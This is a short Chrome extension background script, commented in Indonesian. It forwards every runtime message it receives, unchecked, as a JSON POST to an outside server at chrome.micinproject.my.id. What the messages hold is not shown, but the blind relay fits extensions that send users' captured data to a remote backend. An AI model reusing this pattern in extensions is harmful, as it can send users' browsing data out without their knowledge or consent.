function sendMessageToBackend(data) {
  fetch('https://chrome.micinproject.my.id/api/index.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  })
  .catch(error => {
    console.error('Error:', error);
  });
}

function handleMessage(request) {
  if (request) {
    // Kirim data ke backend saat pesan diterima
    sendMessageToBackend(request);
  } else {
    console.log("Invalid data format received:", request);
  }
}

chrome.runtime.onMessage.addListener(handleMessage);